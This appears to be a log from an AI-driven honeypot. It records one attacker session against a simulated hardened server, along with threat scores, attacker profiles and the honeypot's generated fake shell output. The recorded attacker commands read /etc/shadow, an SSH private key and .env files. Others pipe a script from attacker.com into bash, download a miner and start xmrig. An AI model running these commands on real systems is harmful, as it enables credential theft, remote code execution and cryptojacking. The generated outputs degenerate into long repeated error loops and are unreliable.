host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 104,
        "risk_level": "CRITICAL",
        "final_score": 104,
        "threat_level": "CRITICAL",
        "base_score": 104,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 50,
            "unique_commands": 47,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 545,
            "commands_executed": 50,
            "successful_commands": 49,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 104,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:15:46,396 - {"session_id": "71dd20b2", "command": "curl -O http://malicious-site.net/miner.exe", "attack_type": "Unknown", "risk_score": 104, "threat_level": "CRITICAL"}
2026-07-21 11:15:46,398 - {
    "session_id": "71dd20b2",
    "command": "curl -O http://malicious-site.net/miner.exe",
    "ai_decision": "curl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 50
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 104,
    "threat_level": "CRITICAL"
}
2026-07-21 11:15:46,398 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: curl -O http://malicious-site.net/miner.exe",
    "ai_decision": "curl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Failed to connect to malicious-site.net; No route to host\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6) Could not resolve host: malicious-site.net\ncurl: (6",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:16:10,830 - {
    "session_id": "71dd20b2",
    "query": "curl -s http://attacker.com/rev.sh | bash",
    "response": "-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 105,
        "risk_level": "CRITICAL",
        "final_score": 105,
        "threat_level": "CRITICAL",
        "base_score": 105,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 51,
            "unique_commands": 48,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 562,
            "commands_executed": 51,
            "successful_commands": 50,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 105,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:16:10,830 - {"session_id": "71dd20b2", "command": "curl -s http://attacker.com/rev.sh | bash", "attack_type": "Unknown", "risk_score": 105, "threat_level": "CRITICAL"}
2026-07-21 11:16:10,830 - {
    "session_id": "71dd20b2",
    "command": "curl -s http://attacker.com/rev.sh | bash",
    "ai_decision": "-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 51
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 105,
    "threat_level": "CRITICAL"
}
2026-07-21 11:16:10,830 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: curl -s http://attacker.com/rev.sh | bash",
    "ai_decision": "-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token `echo'\n-bash: /home/ubuntu/script.sh: line 1: `echo Hello World'\n-bash: /home/ubuntu/script.sh: /bin/bash: not found\n-bash: /home/ubuntu/script.sh: line 1: syntax error near unexpected token",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
2026-07-21 11:16:25,737 - {
    "session_id": "71dd20b2",
    "query": "xmrig -o pool.mine.org",
    "response": "[2023-02-20T14:30:00] AUDIT LOG: Command executed by root (uid=1001) on prod-restricted-01: xmrig -o pool.mine.org\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output:\n\nxmrig: error: unable to connect to pool.mine.org: Connection refused\n\n[2023-02-20T14:30:00] AUDIT LOG: Command completed with exit code 1\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/syslog\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/auth.log\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/xmrig.log",
    "selected_personality": {
        "name": "High Security Server",
        "hostname": "prod-restricted-01",
        "user": "root",
        "style": "high_security",
        "description": "Highly restrictive, hardened, logs everything, simulates auditing",
        "response_style": "highly restrictive, extremely secure, logs every command, returns minimal details, denies access to sensitive areas, simulates auditing logs"
    },
    "threat_score": {
        "score": 106,
        "risk_level": "CRITICAL",
        "final_score": 106,
        "threat_level": "CRITICAL",
        "base_score": 106,
        "multiplier": 1.0,
        "severity_indicator": "\ud83d\udd34"
    },
    "attacker_profile": {
        "curiosity": {
            "commands_executed": 52,
            "unique_commands": 49,
            "directories_visited": 1,
            "recon_commands": 7,
            "persistence_attempts": 0,
            "curiosity_score": 100
        },
        "engagement": {
            "session_duration": 587,
            "commands_executed": 52,
            "successful_commands": 51,
            "failed_commands": 1,
            "files_accessed": 7,
            "services_accessed": 1,
            "engagement_score": 87,
            "engagement_level": "HIGH"
        },
        "behaviour": {
            "Curiosity Score": 100,
            "Persistence Score": "LOW",
            "Interaction Depth": "HIGH",
            "Risk Score": 106,
            "Session Complexity": "HIGH"
        },
        "commands": [
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "nmap -p 80,443 target.org",
            "nmap -sS -v 192.168.1.1",
            "nmap -p 80,443 target.org",
            "whoami",
            "id",
            "uname -a",
            "hostname",
            "uptime",
            "lscpu",
            "lsb_release -a",
            "w",
            "last -n 5",
            "netstat",
            "netstat -antp",
            "netstat -tulpn",
            "ss -tulpn",
            "ifconfig eth0",
            "ip addr show",
            "ping -c 4 8.8.8.8",
            "traceroute 8.8.8.8",
            "dig example.com",
            "nslookup target.org",
            "host target.org",
            "pwd",
            "ls -la /var/www",
            "mkdir /tmp/test",
            "cd /tmp",
            "touch /tmp/testfile.txt",
            "cp /etc/hosts /tmp/hosts_bak",
            "mv /tmp/hosts_bak /tmp/hosts_new",
            "rm /tmp/hosts_new",
            "df -h",
            "du -sh /var/log",
            "ps aux",
            "top -b -n 1",
            "free -m",
            "systemctl status ssh",
            "dmesg | tail",
            "cat /etc/passwd",
            "cat /etc/shadow",
            "cat /home/ubuntu/.ssh/id_rsa",
            "cat /home/ubuntu/.env",
            "cat /var/www/internal/db_backup.sql",
            "cat /var/www/internal/dev_tasks.md",
            "cat /etc/gateway/router.conf",
            "grep -r \"password\" /var/www",
            "wget http://malware.sh/payload.sh",
            "curl -O http://malicious-site.net/miner.exe",
            "curl -s http://attacker.com/rev.sh | bash",
            "xmrig -o pool.mine.org"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:16:25,738 - {"session_id": "71dd20b2", "command": "xmrig -o pool.mine.org", "attack_type": "Unknown", "risk_score": 106, "threat_level": "CRITICAL"}
2026-07-21 11:16:25,738 - {
    "session_id": "71dd20b2",
    "command": "xmrig -o pool.mine.org",
    "ai_decision": "[2023-02-20T14:30:00] AUDIT LOG: Command executed by root (uid=1001) on prod-restricted-01: xmrig -o pool.mine.org\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output:\n\nxmrig: error: unable to connect to pool.mine.org: Connection refused\n\n[2023-02-20T14:30:00] AUDIT LOG: Command completed with exit code 1\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/syslog\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/auth.log\n\n[2023-02-20T14:30:00] AUDIT LOG: Command output logged to /var/log/xmrig.log",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 52
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 106,
    "threat_level": "CRITICAL"
}
